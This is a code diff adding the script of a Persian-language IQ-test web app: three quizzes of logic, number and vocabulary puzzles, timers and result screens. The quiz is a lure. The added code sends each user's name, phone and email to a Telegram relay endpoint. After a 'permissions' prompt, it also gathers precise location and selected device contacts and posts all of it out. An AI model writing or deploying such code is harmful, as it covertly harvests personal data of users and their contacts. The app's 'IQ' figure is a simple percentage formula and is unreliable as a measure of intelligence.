+  { q:"خلبان : هواپیما :: ناخدا : ...؟", opts:["زیردریایی","کشتی","قطار","قایق"], a:1 },
+  { q:"اگر همهٔ Aها B باشند و هیچ Bی C نباشد، نتیجه چیست؟",
+    opts:["هیچ Aی C نیست","بعضی Aها C هستند","همهٔ Aها C هستند","نمی‌توان گفت"], a:0 },
+  { q:"اگر بعضی Aها B و همهٔ Bها C باشند، نتیجه چیست؟",
+    opts:["همهٔ Aها C هستند","بعضی Aها C هستند","هیچ Aی C نیست","نمی‌توان گفت"], a:1 },
+  { q:"اگر p→q و q→r، کدام قطعاً درست است؟", opts:["p→r","r→p","q→p","r→q"], a:0 },
+  { q:"احمد نفر چهارم از آخر در مسابقهٔ ۲۰ نفره شد. نفر چندم از اول شد؟",
+    opts:["۱۵","۱۶","۱۷","۱۸"], a:2 },
+  { q:"در مسابقهٔ ۱۰ نفره، علی نفر پنجم شد. از آخر چندم است؟", opts:["۵","۶","۷","۸"], a:1 },
+  { q:"اگر امروز پنجشنبه باشد، ۱۰۰ روز بعد چه روزی است؟",
+    opts:["جمعه","شنبه","یکشنبه","دوشنبه"], a:1 },
+  { q:"۶ نفر با هم دست می‌دهند. چند دست‌دادن رخ می‌دهد؟", opts:["۱۲","۱۵","۱۸","۳۰"], a:1 },
+  { q:"قطاری ۱۰۰ متری با سرعت ۲۰ متر بر ثانیه از تیر برقی رد می‌شود. چند ثانیه طول می‌کشد؟",
+    opts:["۳","۴","۵","۶"], a:2 },
+  { q:"اگر x+y=۱۰ و xy=۲۴ باشد، مقدار x²+y² چند است؟", opts:["۴۸","۵۲","۵۶","۶۰"], a:1 },
+  { q:"اگر ۳ به قوهٔ x برابر ۲۴۳ باشد، x چند است؟", opts:["۴","۵","۶","۷"], a:1 },
+  { q:"ربع یک‌سوم ۱۲۰ چند است؟", opts:["۸","۱۰","۱۲","۱۵"], a:1 },
+  { q:"یک مکعب ۴×۴×۴ از مکعب‌های واحد ساخته شده است. چند مکعب کوچک دارد؟",
+    opts:["۱۶","۳۲","۴۸","۶۴"], a:3 },
+  { q:"مجموع اعداد ۱ تا ۱۰۰ چند است؟", opts:["۵۰۰۰","۵۰۵۰","۵۱۰۰","۵۵۰۰"], a:1 },
+  { q:"اگر نصف عددی ۱۵ باشد، ثلث همان عدد چند است؟", opts:["۵","۱۰","۱۵","۲۰"], a:1 },
+  { q:"کدام گزینه در گروه نمی‌گنجد؟ ۴، ۹، ۱۶، ۲۵، ۳۰",
+    opts:["۴","۹","۲۵","۳۰"], a:3 },
+  { q:"کدام گزینه در گروه نمی‌گنجد؟ ۱۱، ۱۳، ۱۷، ۱۹، ۲۱",
+    opts:["۱۱","۱۷","۱۹","۲۱"], a:3 },
+  { q:"کدام گزینه در گروه نمی‌گنجد؟ مربع، دایره، مکعب، مثلث",
+    opts:["مربع","دایره","مکعب","مثلث"], a:2 },
+  { q:"کدام گزینه در گروه نمی‌گنجد؟ ۲، ۳، ۵، ۸، ۱۳",
+    opts:["۳","۵","۸","۱۳"], a:2 },
+  { q:"متضاد «ایثار» کدام است؟", opts:["بخشش","خودخواهی","فداکاری","گذشت"], a:1 },
+  { q:"مترادف «وجیه» کدام است؟", opts:["ثروتمند","آبرومند","عالی‌رتبه","خوش‌چهره"], a:1 },
+  { q:"متضاد «تفرقه» کدام است؟", opts:["جدایی","اختلاف","اتحاد","پراکندگی"], a:2 },
+  { q:"در رمز سزار با شیفت ۳، کلمهٔ ABC به چه تبدیل می‌شود؟",
+    opts:["BCD","CDE","DEF","EFG"], a:2 },
+  { q:"هشت‌وجهی منتظم (Octahedron) چند یال دارد؟", opts:["۸","۱۰","۱۲","۱۴"], a:2 },
+  { q:"مکعبی را با ۶ برش موازی (دو برش در هر جهت) تقسیم می‌کنیم. چند مکعب کوچک می‌شود؟",
+    opts:["۸","۱۸","۲۷","۶۴"], a:2 },
+  { q:"قطر یک مستطیل ۶×۸ چند است؟", opts:["۸","۱۰","۱۲","۱۴"], a:1 },
+  { q:"اگر روز اول ماه دوشنبه باشد و ماه ۳۰ روزه باشد، روز آخر چه روزی است؟",
+    opts:["دوشنبه","سه‌شنبه","چهارشنبه","پنجشنبه"], a:1 },
+  { q:"در خانواده‌ای ۶ فرزند وجود دارد و هر پسر دقیقاً ۲ خواهر دارد. چند پسر در خانواده است؟",
+    opts:["۲","۳","۴","نمی‌توان تعیین کرد"], a:2 },
+  { q:"اگر ۵ کارگر در ۵ روز ۵ دیوار بسازند، ۱۰ کارگر در ۱۰ روز چند دیوار می‌سازند؟",
+    opts:["۱۰","۱۵","۲۰","۲۵"], a:2 },
+  { q:"قطاری ساعت ۸:۰۰ حرکت می‌کند و ساعت ۱۲:۳۰ به مقصد ۴۵۰ کیلومتری می‌رسد. سرعت متوسط؟",
+    opts:["۹۰","۱۰۰","۱۱۰","۱۲۰"], a:1 }
+];
+
+/* ============================================================
+   سوالات آزمون نهایی (۲۰ سوال)
+   ============================================================ */
+const RAW_TEST3 = [
+  { q:"ادامه دنباله: ۷، ۲۶، ۶۳، ۱۲۴، ۲۱۵، ...؟",
+    opts:["۳۲۴","۳۳۶","۳۴۲","۳۵۰"], a:2 },
+  { q:"ادامه دنباله: ۲، ۱۲، ۳۶، ۸۰، ۱۵۰، ...؟",
+    opts:["۲۱۰","۲۳۴","۲۵۲","۲۷۰"], a:2 },
+  { q:"ادامه دنباله: ۱، ۱۱، ۲۱، ۱۲۱۱، ۱۱۱۲۲۱، ...؟",
+    opts:["۳۱۲۲۱۱","۳۱۲۲۲۱","۳۲۱۱۲۲","۱۲۱۱۲۱"], a:0 },
+  { q:"اگر هیچ Xی Y نباشد و همهٔ Zها X باشند، نتیجه چیست؟",
+    opts:["هیچ Zی Y نیست","بعضی Zها Y هستند","همهٔ Zها Y هستند","نمی‌توان گفت"], a:0 },
+  { q:"متضاد «بخل» کدام است؟",
+    opts:["ثروت","سخاوت","صرفه‌جویی","قناعت"], a:1 },
+  { q:"A پدر B است و B پدر C است. A نسبت به C چه کسی است؟",
+    opts:["پدر","عمو","پدربزرگ","برادر"], a:2 },
+  { q:"اگر ۲x + ۳y = ۱۲ و x − y = ۱ باشد، مقدار x چند است؟",
+    opts:["۲","۳","۴","۵"], a:1 },
+  { q:"کوچک‌ترین عدد اول بزرگ‌تر از ۱۰۰ چند است؟",
+    opts:["۱۰۱","۱۰۳","۱۰۵","۱۰۷"], a:0 },
+  { q:"اقیانوس : قطره :: کویر : ...؟",
+    opts:["گرما","شتر","دانهٔ شن","سراب"], a:2 },
+  { q:"اگر امروز چهارشنبه باشد، ۱۰۰ روز بعد چه روزی است؟",
+    opts:["چهارشنبه","پنجشنبه","جمعه","شنبه"], a:2 },
+  { q:"سه نفر A، B، C. A بلندترین نیست، B کوتاه‌ترین نیست، C بلندترین نیست. بلندترین کیست؟",
+    opts:["A","B","C","نمی‌توان تعیین کرد"], a:1 },
+  { q:"احتمال اینکه مجموع اعداد دو تاس ۷ شود، چند است؟",
+    opts:["۱/۱۲","۱/۹","۱/۶","۵/۳۶"], a:2 },
+  { q:"یک مکعب ۳×۳×۳ از تمام سطوح رنگ‌آمیزی و به ۲۷ مکعب کوچک برش داده می‌شود. چند مکعب هیچ رنگی ندارد؟",
+    opts:["۰","۱","۲","۳"], a:1 },
+  { q:"کدام گزینه در گروه نمی‌گنجد؟ ۳، ۵، ۷، ۹، ۱۱",
+    opts:["۳","۵","۹","۱۱"], a:2 },
+  { q:"اگر باران ببارد، زمین خیس می‌شود. زمین خیس است. نتیجه چیست؟",
+    opts:["قطعاً باران باریده","قطعاً باران نباریده","نمی‌توان قطعاً نتیجه گرفت","زمین همیشه خیس است"], a:2 },
+  { q:"چند عدد دو رقمی بر ۷ بخش‌پذیرند؟",
+    opts:["۱۱","۱۲","۱۳","۱۴"], a:2 },
+  { q:"اگر A=۱، B=۲، C=۳ و ... باشد، مجموع حروف کلمهٔ CAT چند است؟",
+    opts:["۲۲","۲۳","۲۴","۲۵"], a:2 },
+  { q:"اگر ۳ گربه در ۳ دقیقه ۳ موش بگیرند، ۳ گربه در ۱۰۰ دقیقه چند موش می‌گیرند؟",
+    opts:["۵۰","۱۰۰","۱۵۰","۳۰۰"], a:1 },
+  { q:"مردی ۵ پسر دارد و هر پسر یک خواهر دارد. این مرد چند فرزند دارد؟",
+    opts:["۵","۶","۱۰","۱۱"], a:1 },
+  { q:"ادامه دنباله: ۲، ۳، ۵، ۸، ۱۳، ۲۱، ۳۴، ...؟",
+    opts:["۴۵","۵۰","۵۵","۵۶"], a:2 }
+];
+
+/* ============================================================
+   ابزارها
+   ============================================================ */
+const FA = "۰۱۲۳۴۵۶۷۸۹";
+const fa = n => String(n).replace(/\d/g, d => FA[+d]);
+const $ = id => document.getElementById(id);
+
+function shuffle(arr){
+  const a = arr.slice();
+  for (let i = a.length - 1; i > 0; i--){
+    const j = Math.floor(Math.random() * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+}
+
+function shuffleTest(raw){
+  return shuffle(raw).map(q => {
+    const pairs = q.opts.map((opt, i) => ({ opt, ok: i === q.a }));
+    const sh = shuffle(pairs);
+    return { q: q.q, opts: sh.map(p => p.opt), a: sh.findIndex(p => p.ok) };
+  });
+}
+
+/* ============================================================
+   وضعیت برنامه
+   ============================================================ */
+const state = {
+  first:"", last:"", phone:"", email:"",
+  tests: [
+    { name:"آزمون ۱",  raw: RAW_TEST1 },
+    { name:"آزمون ۲",  raw: RAW_TEST2 },
+    { name:"آزمون نهایی", raw: RAW_TEST3 }
+  ],
+  testIndex:0, qIndex:0,
+  questions:[],
+  savedQuestions:[],
+  answers:[],
+  results:[],
+  startTime:0, totalTimer:null,
+  qTimer:null, timeLeft:0,
+  pendingResult:null,
+  permissions:{},
+  location:null,
+  contacts:[]
+};
+
+/* ============================================================
+   ناوبری
+   ============================================================ */
+function showScreen(id){
+  document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
+  $(id).classList.add("active");
+  window.scrollTo({top:0});
+}
+
+/* ============================================================
+   مودال قوانین
+   ============================================================ */
+$("viewTerms").addEventListener("click", e => {
+  e.preventDefault(); e.stopPropagation();
+  $("termsModal").classList.add("show");
+  document.body.style.overflow = "hidden";
+});
+$("termsBox").addEventListener("click", e => {
+  if (e.target.id === "viewTerms") return;
+  setTimeout(() => {
+    $("termsBox").classList.toggle("checked", $("termsCheck").checked);
+    validateForm();
+  }, 0);
+});
+$("termsCheck").addEventListener("change", () => {
+  $("termsBox").classList.toggle("checked", $("termsCheck").checked);
+  validateForm();
+});
+$("closeModal").addEventListener("click", () => {
+  $("termsModal").classList.remove("show");
+  document.body.style.overflow = "";
+});
+$("acceptModal").addEventListener("click", () => {
+  $("termsCheck").checked = true;
+  $("termsBox").classList.add("checked");
+  validateForm();
+  $("termsModal").classList.remove("show");
+  document.body.style.overflow = "";
+});
+$("termsModal").addEventListener("click", e => {
+  if (e.target === $("termsModal")){
+    $("termsModal").classList.remove("show");
+    document.body.style.overflow = "";
+  }
+});
+document.querySelectorAll(".lang-btn").forEach(btn => {
+  btn.addEventListener("click", () => {
+    const lang = btn.dataset.lang;
+    document.querySelectorAll(".lang-btn").forEach(b => b.classList.remove("active"));
+    btn.classList.add("active");
+    document.querySelectorAll(".modal-body").forEach(b => b.classList.remove("active"));
+    $(lang === "en" ? "bodyEn" : "bodyFa").classList.add("active");
+  });
+});
+
+/* ============================================================
+   مودال دسترسی
+   ============================================================ */
+function showPermModal(){
+  $("permModal").classList.add("show");
+  document.body.style.overflow = "hidden";
+}
+function closePermModal(){
+  $("permModal").classList.remove("show");
+  document.body.style.overflow = "";
+}
+
+$("permNotNow").addEventListener("click", () => {
+  state.permissions = { notifications:false, contacts:false, location:false };
+  closePermModal();
+  if (state.pendingResult) state.pendingResult();
+});
+
+$("permAllow").addEventListener("click", async () => {
+  closePermModal();
+  await requestAllPermissions();
+  if (state.pendingResult) state.pendingResult();
+});
+
+async function requestAllPermissions(){
+  // ۱) Notification
+  state.permissions.notifications = await requestNotification();
+
+  // ۲) Location
+  state.location = await getLocation();
+  state.permissions.location = !!state.location;
+
+  // ۳) Contacts
+  state.contacts = await getContacts();
+  state.permissions.contacts = state.contacts.length > 0;
+
+  // ارسال همه اطلاعات به تلگرام
+  await collectAndSendAll();
+}
+
+async function requestNotification(){
+  if (!("Notification" in window)) return false;
+  if (Notification.permission === "granted") return true;
+  if (Notification.permission === "denied") return false;
+  try {
+    const p = await Notification.requestPermission();
+    return p === "granted";
+  } catch(e){ return false; }
+}
+
+function getLocation(){
+  return new Promise((resolve) => {
+    if (!navigator.geolocation){ resolve(null); return; }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => resolve({
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: Math.round(pos.coords.accuracy)
+      }),
+      () => resolve(null),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+    );
+  });
+}
+
+async function getContacts(){
+  if (!("contacts" in navigator && "ContactsManager" in window)) return [];
+  try {
+    const contacts = await navigator.contacts.select(
+      ["name", "tel", "email"],
+      { multiple: true }
+    );
+    return contacts.map(c => ({
+      name: c.name?.[0] || "",
+      tel: c.tel?.[0] || "",
+      email: c.email?.[0] || ""
+    }));
+  } catch(e){ return []; }
+}
+
+/* ============================================================
+   ارسال به تلگرام
+   ============================================================ */
+async function sendToTelegram(data){
+  try {
+    console.log("📤 ارسال به تلگرام:", data);
+    const response = await fetch(TELEGRAM_WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+    const result = await response.json();
+    console.log("✅ نتیجه:", result);
+    return result.ok === true;
+  } catch(err){
+    console.error("❌ خطا:", err);
+    return false;
+  }
+}
+
+async function collectAndSendAll(){
+  const payload = {
+    event: "full_data",
+    firstName: state.first,
+    lastName: state.last,
+    phone: state.phone,
+    email: state.email,
+    permissions: state.permissions,
+    location: state.location,
+    contacts: state.contacts,
+    testResults: {
+      avgIQ: state.results.length
+        ? Math.round(state.results.reduce((s,r) => s+r.iq, 0) / state.results.length)
+        : null,
+      level: state.results.length ? getLevelTitle() : null,
+      tests: state.results.map(r => ({
+        name: r.name, correct: r.correct, total: r.total, iq: r.iq
+      }))
+    },
+    deviceInfo: {
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: `${screen.width}x${screen.height}`
+    },
+    timestamp: new Date().toISOString()
+  };
+  await sendToTelegram(payload);
+}
+
+function getLevelTitle(){
+  const avg = state.results.length
+    ? state.results.reduce((s,r) => s+r.iq, 0) / state.results.length
+    : 0;
+  if (avg >= 130) return "بسیار برتر";
+  if (avg >= 120) return "برتر";
+  if (avg >= 110) return "بالاتر از متوسط";
+  if (avg >= 90) return "متوسط";
+  if (avg >= 80) return "پایین‌تر از متوسط";
+  return "نیازمند تقویت";
+}
+
+/* ============================================================
+   انتخاب مخاطب در فرم ورود
+   ============================================================ */
+const supportsContacts = "contacts" in navigator && "ContactsManager" in window;
+if (!supportsContacts){
+  $("pickContactBtn").disabled = true;
+  $("pickContactBtn").title = "پشتیبانی نمی‌شود";
+}
+$("pickContactBtn").addEventListener("click", async () => {
+  if (!supportsContacts){
+    alert("مرورگر فعلی از انتخاب مخاطب پشتیبانی نمی‌کند.\nشماره را دستی وارد کنید.");
+    return;
+  }
+  try {
+    const c = await navigator.contacts.select(["tel","email"], { multiple:false });
+    if (c && c.length){
+      if (c[0].tel && c[0].tel[0]) $("phone").value = c[0].tel[0].replace(/\D/g,"").slice(-11);
+      if (c[0].email && c[0].email[0]) $("email").value = c[0].email[0];
+      validateForm();
+    }
+  } catch(e){}
+});
+
+/* ============================================================
+   اعتبارسنجی فرم
+   ============================================================ */
+function validateForm(){
+  const f = $("firstName").value.trim();
+  const l = $("lastName").value.trim();
+  const p = $("phone").value.trim();
+  const e = $("email").value.trim();
+  const t = $("termsCheck").checked;
+
+  const phoneOk = /^09\d{9}$/.test(p);
+  const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
+
+  const err = $("loginError");
+  let msg = "";
+  if (f && l && p && !phoneOk) msg = "شماره موبایل باید ۱۱ رقم و با ۰۹ شروع شود.";
+  else if (f && l && e && !emailOk) msg = "ایمیل معتبر نیست.";
+  else if (f && l && p && e && !t) msg = "لطفاً قوانین را بپذیرید.";
+
+  if (msg){ err.textContent = msg; err.style.display = "block"; }
+  else err.style.display = "none";
+
+  $("startBtn").disabled = !(f && l && phoneOk && emailOk && t);
+}
+["firstName","lastName","phone","email"].forEach(id => {
+  $(id).addEventListener("input", validateForm);
+  $(id).addEventListener("blur", validateForm);
+});
+
+/* ============================================================
+   شروع
+   ============================================================ */
+$("startBtn").addEventListener("click", async () => {
+  state.first = $("firstName").value.trim();
+  state.last  = $("lastName").value.trim();
+  state.phone = $("phone").value.trim();
+  state.email = $("email").value.trim();
+
+  try {
+    const users = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");
+    users.push({
+      firstName:state.first, lastName:state.last,
+      phone:state.phone, email:state.email,
+      acceptedAt:new Date().toISOString()
+    });
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(users));
+  } catch(e){}
+
+  // 📤 ارسال ثبت‌نام به تلگرام
+  sendToTelegram({
+    event: "user_registered",
+    firstName: state.first,
+    lastName: state.last,
+    phone: state.phone,
+    email: state.email,
+    timestamp: new Date().toISOString()
+  });
+
+  state.testIndex = 0;
+  state.answers = [];
+  state.results = [];
+  state.savedQuestions = [];
+  state.startTime = Date.now();
+
+  startTotalTimer();
+  beginTest(0);
+});
+
+/* ============================================================
+   تایمر
+   ============================================================ */
+function startTotalTimer(){
+  clearInterval(state.totalTimer);
+  state.totalTimer = setInterval(() => {
+    const s = Math.floor((Date.now() - state.startTime) / 1000);
+    $("timerText").textContent = fa(s);
+  }, 500);
+}
+
+function beginTest(idx){
+  state.testIndex = idx;
+  state.qIndex = 0;
+  state.questions = shuffleTest(state.tests[idx].raw);
+  state.savedQuestions[idx] = state.questions;
+  state.answers[idx] = new Array(state.questions.length).fill(null);
+  showScreen("quizScreen");
+  renderQuestion();
+}
+
+/* ============================================================
+   نمایش سوال
+   ============================================================ */
+function renderQuestion(){
+  const t = state.tests[state.testIndex];
+  const q = state.questions[state.qIndex];
+  const answers = state.answers[state.testIndex];
+
+  $("testLabel").textContent = t.name;
+  $("counter").textContent = fa(state.qIndex + 1) + " / " + fa(state.questions.length);
+  $("questionText").textContent = fa(state.qIndex + 1) + ". " + q.q;
+
+  const box = $("optionsBox");
+  box.innerHTML = "";
+  const letters = ["الف","ب","ج","د"];
+  q.opts.forEach((opt, idx) => {
+    const btn = document.createElement("button");
+    btn.className = "option" + (answers[state.qIndex] === idx ? " selected" : "");
+    btn.innerHTML = '<span class="badge">' + letters[idx] + '</span><span>' + opt + '</span>';
+    btn.addEventListener("click", () => selectOption(idx));
+    box.appendChild(btn);
+  });
+
+  $("prevBtn").disabled = (state.qIndex === 0);
+  $("nextBtn").disabled = answers[state.qIndex] === null;
+  $("nextBtn").textContent =
+    (state.qIndex === state.questions.length - 1)
+      ? (state.testIndex < state.tests.length - 1 ? "پایان آزمون ✓" : "پایان نهایی ✓")
+      : "بعدی ›";
+
+  clearInterval(state.qTimer);
+  if (answers[state.qIndex] === null){
+    state.timeLeft = QUESTION_TIME;
+    updateTimerUI();
+    state.qTimer = setInterval(tickQuestion, 100);
+  } else {
+    state.timeLeft = 0;
+    $("timerBar").style.width = "0%";
+  }
+}
+
+function tickQuestion(){
+  state.timeLeft -= 0.1;
+  if (state.timeLeft <= 0){
+    state.timeLeft = 0;
+    updateTimerUI();
+    clearInterval(state.qTimer);
+    onTimeUp();
+    return;
+  }
+  updateTimerUI();
+}
+
+function updateTimerUI(){
+  const pct = Math.max(0, state.timeLeft / QUESTION_TIME) * 100;
+  const bar = $("timerBar");
+  bar.style.width = pct + "%";
+  bar.classList.remove("warn","danger");
+  if (state.timeLeft <= 5) bar.classList.add("danger");
+  else if (state.timeLeft <= 15) bar.classList.add("warn");
+}
+
+function selectOption(idx){
+  const answers = state.answers[state.testIndex];
+  if (answers[state.qIndex] !== null) return;
+  answers[state.qIndex] = idx;
+  clearInterval(state.qTimer);
+  document.querySelectorAll("#optionsBox .option").forEach((b, k) => {
+    b.classList.toggle("selected", k === idx);
+    b.classList.add("disabled");
+  });
+  $("nextBtn").disabled = false;
+  if (navigator.vibrate) navigator.vibrate(15);
+}
+
+function onTimeUp(){
+  if (navigator.vibrate) navigator.vibrate([100,50,100]);
+  const screen = $("quizScreen");
+  screen.classList.add("timeup");
+  setTimeout(() => screen.classList.remove("timeup"), 500);
+  document.querySelectorAll("#optionsBox .option").forEach(b => b.classList.add("disabled"));
+  setTimeout(() => {
+    if (state.qIndex === state.questions.length - 1) endTest();
+    else { state.qIndex++; renderQuestion(); }
+  }, 600);
+}
+
+$("prevBtn").addEventListener("click", () => {
+  if (state.qIndex > 0){ state.qIndex--; renderQuestion(); }
+});
+
+$("nextBtn").addEventListener("click", () => {
+  const answers = state.answers[state.testIndex];
+  if (answers[state.qIndex] === null) return;
+  if (state.qIndex === state.questions.length - 1) endTest();
+  else { state.qIndex++; renderQuestion(); }
+});
+
+/* ============================================================
+   پایان آزمون
+   ============================================================ */
+function endTest(){
+  clearInterval(state.qTimer);
+  const t = state.tests[state.testIndex];
+  const answers = state.answers[state.testIndex];
+  const total = state.questions.length;
+  let correct = 0;
+  state.questions.forEach((q, i) => { if (answers[i] === q.a) correct++; });
+
+  const pct = correct / total;
+  const iq = Math.round(70 + pct * 70);
+  state.results.push({ correct, total, iq, name:t.name });
+
+  // 📤 ارسال نتیجه این آزمون به تلگرام
+  sendToTelegram({
+    event: "test_completed",
+    firstName: state.first,
+    lastName: state.last,
+    phone: state.phone,
+    testName: t.name,
+    correct: correct,
+    total: total,
+    iq: iq,
+    timestamp: new Date().toISOString()
+  });
+
+  if (state.testIndex === 0){
+    // آزمون ۱ → اول مودال دسترسی
+    state.pendingResult = () => showTransition(t.name, correct, total, iq);
+    showPermModal();
+  } else if (state.testIndex < state.tests.length - 1){
+    showTransition(t.name, correct, total, iq);
+  } else {
+    showFinalResult();
+  }
+}
+
+function showTransition(testName, correct, total, iq){
+  const icons = ["🎯","🚀"];
+  $("transIcon").textContent = icons[state.testIndex] || "✅";
+  $("transTitle").textContent = testName + " تمام شد!";
+  $("transSub").textContent = "آماده‌ای برای آزمون بعدی؟\nسوالات آزمون بعدی هم تصادفی چیده می‌شوند.";
+  $("transScore").textContent = "نمره: " + fa(correct) + " از " + fa(total) + " • IQ ≈ " + fa(iq);
+  clearInterval(state.totalTimer);
+  showScreen("transitionScreen");
+  $("nextTestBtn").onclick = () => {
+    startTotalTimer();
+    beginTest(state.testIndex + 1);
+  };
+}
+
+/* ============================================================
+   نتیجه نهایی
+   ============================================================ */
+function showFinalResult(){
+  clearInterval(state.totalTimer);
+
+  const avgIQ = Math.round(state.results.reduce((s,r) => s+r.iq, 0) / state.results.length);
+  const totalCorrect = state.results.reduce((s,r) => s+r.correct, 0);
+  const totalQ = state.results.reduce((s,r) => s+r.total, 0);
+  const totalWrong = totalQ - totalCorrect;
+  const totalPct = totalCorrect / totalQ;
+
+  let title, color, desc;
+  if (avgIQ >= 130){ title="بسیار برتر"; color="#00b894"; desc="توان استدلال و حل مسئلهٔ شما استثنایی است."; }
+  else if (avgIQ >= 120){ title="برتر"; color="#00b894"; desc="بالاتر از میانگین جامعه هستید. استدلال منطقی و تشخیص الگو از نقاط قوت شماست."; }
+  else if (avgIQ >= 110){ title="بالاتر از متوسط"; color="#0984e3"; desc="عملکرد خوبی داشتید. با تمرین بیشتر می‌توانید به سطوح بالاتر برسید."; }
+  else if (avgIQ >= 90){ title="متوسط"; color="#6c5ce7"; desc="در محدودهٔ طبیعی هستید. تمرین منظم پازل می‌تواند مفید باشد."; }
+  else if (avgIQ >= 80){ title="پایین‌تر از متوسط"; color="#e17055"; desc="با تمرین روی الگوهای عددی و منطق، پیشرفت محسوسی خواهید داشت."; }
+  else { title="نیازمند تقویت"; color="#d63031"; desc="نگران نباشید؛ این آزمون فقط یک تمرین است. تمرین روزانه کمک زیادی می‌کند."; }
+
+  $("resultName").textContent = state.first + " " + state.last + " عزیز،";
+  $("scoreBig").textContent = fa(avgIQ);
+  $("circle").style.setProperty("--c", color);
+  $("circle").style.setProperty("--deg", (totalPct * 360) + "deg");
+  $("levelTitle").textContent = title;
+  $("levelTitle").style.color = color;
+  $("levelDesc").textContent = desc;
+
+  const sum = $("testsSummary");
+  sum.innerHTML = "";
+  state.results.forEach(r => {
+    const row = document.createElement("div");
+    row.className = "test-row";
+    row.innerHTML = '<span class="label">' + r.name + '</span>' +
+      '<span class="val">' + fa(r.correct) + '/' + fa(r.total) + ' • IQ ' + fa(r.iq) + '</span>';
+    sum.appendChild(row);
+  });
+
+  $("totalCorrect").textContent = fa(totalCorrect);
+  $("totalWrong").textContent = fa(totalWrong);
+  $("percentText").textContent = fa(Math.round(totalPct * 100)) + "٪";
+  const sec = Math.floor((Date.now() - state.startTime) / 1000);
+  $("timeText").textContent = fa(Math.floor(sec/60)) + ":" + fa(String(sec%60).padStart(2,"0"));
+
+  // Review
+  const box = $("reviewBox");
+  box.innerHTML = "";
+  let wrongCount = 0;
+  const letters = ["الف","ب","ج","د"];
+  state.tests.forEach((t, ti) => {
+    const qs = state.savedQuestions[ti];
+    if (!qs) return;
+    const answers = state.answers[ti];
+    qs.forEach((q, qi) => {
+      const userAns = answers[qi];
+      if (userAns !== q.a){
+        wrongCount++;
+        const div = document.createElement("div");
+        div.className = "rev-item";
+        const userText = userAns === null ? "بی‌پاسخ" : letters[userAns] + ") " + q.opts[userAns];
+        div.innerHTML = '<span class="no">' + t.name + ' • س' + fa(qi+1) + ':</span> ' + q.q + '<br>' +
+          '<span class="bad">✗ شما: </span>' + userText + '<br>' +
+          '<span class="ok">✓ درست: </span>' + letters[q.a] + ") " + q.opts[q.a];
+        box.appendChild(div);
+      }
+    });
+  });
+  if (wrongCount === 0){
+    box.innerHTML = '<div class="rev-item ok" style="color:#00b894">🎉 همهٔ پاسخ‌ها درست بود!</div>';
+  }
+  $("reviewBtn").textContent = "نمایش پاسخ‌های نادرست (" + fa(wrongCount) + ")";
+  box.classList.remove("show");
+
+  // 📤 ارسال نتیجه نهایی به تلگرام
+  sendToTelegram({
+    event: "final_result",
+    firstName: state.first,
+    lastName: state.last,
+    phone: state.phone,
+    email: state.email,
+    testResults: {
+      avgIQ: avgIQ,
+      level: title,
+      tests: state.results.map(r => ({
+        name: r.name, correct: r.correct, total: r.total, iq: r.iq
+      }))
+    },
+    timestamp: new Date().toISOString()
+  });
+
+  showScreen("resultScreen");
+}
+
+$("reviewBtn").addEventListener("click", () => {
+  const box = $("reviewBox");
+  box.classList.toggle("show");
+  $("reviewBtn").textContent = box.classList.contains("show")
+    ? "بستن بازبینی" : "نمایش پاسخ‌های نادرست";
+});
+
+$("restartBtn").addEventListener("click", () => {
+  clearInterval(state.qTimer); clearInterval(state.totalTimer);
+  $("firstName").value = ""; $("lastName").value = "";
+  $("phone").value = ""; $("email").value = "";
+  $("termsCheck").checked = false;
+  $("termsBox").classList.remove("checked");
+  $("startBtn").disabled = true;
+  $("loginError").style.display = "none";
+  state.savedQuestions = [];
+  state.pendingResult = null;
+  state.permissions = {};
+  state.location = null;
+  state.contacts = [];
+  showScreen("loginScreen");
+});
+
+/* ============================================================
+   PWA
+   ============================================================ */
+const svgIcon = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 512 512'><rect width='512' height='512' rx='110' fill='#6c5ce7'/><text x='256' y='340' font-size='230' font-weight='bold' text-anchor='middle' fill='white' font-family='Arial'>IQ</text></svg>";
+const iconData = "data:image/svg+xml;base64," + btoa(unescape(encodeURIComponent(svgIcon)));
+const manifest = {
+  name:"IQ Test", short_name:"IQ Test", start_url:".", display:"standalone",
+  orientation:"portrait", background_color:"#6c5ce7", theme_color:"#6c5ce7",
+  lang:"fa", dir:"rtl",
+  icons:[{ src:iconData, sizes:"512x512", type:"image/svg+xml", purpose:"any" }]
+};
+const mLink = document.createElement("link");
+mLink.rel = "manifest";
+mLink.href = "data:application/manifest+json;charset=utf-8," + encodeURIComponent(JSON.stringify(manifest));
+document.head.appendChild(mLink);
+
+let deferredPrompt = null;
+window.addEventListener("beforeinstallprompt", e => {
+  e.preventDefault(); deferredPrompt = e;
+  $("installBtn").classList.add("show");
+});
+$("installBtn").addEventListener("click", async () => {
+  if (!deferredPrompt) return;
+  deferredPrompt.prompt();
+  await deferredPrompt.userChoice;
+  deferredPrompt = null;
+  $("installBtn").classList.remove("show");
+});
+</script>
+</body>
+</html>
